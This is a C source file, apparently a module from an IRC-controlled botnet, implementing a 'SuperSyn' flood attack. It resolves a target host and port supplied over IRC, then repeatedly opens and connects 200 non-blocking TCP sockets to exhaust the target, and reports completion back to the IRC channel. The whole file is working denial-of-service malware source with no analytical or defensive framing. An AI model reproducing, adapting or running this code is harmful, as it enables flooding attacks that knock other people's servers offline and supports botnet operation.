#include "../../Headers/includes.h"
#include "../../Headers/functions.h"

#ifndef NO_SUPERSYN

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define SUPERSYN_SOCKETS 200


#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

DWORD WINAPI SuperSynThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SUPERSYN supersyn = *((SUPERSYN *)param);
	SUPERSYN *supersyns = (SUPERSYN *)param;
	supersyns->gotinfo = TRUE;
	IRC* irc=(IRC*)supersyn.conn;
	
	if (!supersyn.silent) 
		irc->pmsg(supersyn.target, "[SUPERSYN] Done with flood (%iKB/sec).05>", SuperSyn(supersyn.ip, supersyn.port, supersyn.length));

	clearthread(supersyn.threadnum);
	ExitThread(0);
	return 0;
}

long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
{
	int superdelay = 100;
	SOCKADDR_IN    SockAddr;
	SOCKET         sock[SUPERSYN_SOCKETS];
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = fhtons(TargetPort);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = TargetIP;
	SockAddr.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < len) {
		for (c=0;c<SUPERSYN_SOCKETS;c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		for (c=0;c<SUPERSYN_SOCKETS;c++)
  			connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      		Sleep(superdelay);
		for (c=0;c<SUPERSYN_SOCKETS;c++)
			closesocket(sock[c]); //close sockets
		i++;
	}
	return 0;
}

long SuperSyn(char *target, char *port, char *len)
{
	unsigned long IP = finet_addr(target);

	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(target);
		if (pHE == 0)
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);
	}

	unsigned long TargetIP = IP;
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);

	long num = SuperSynSend(TargetIP, p, t);

	if (num == 0)
		num = 1;
	num = num / 1000 / t;

	return num;
}

#endif
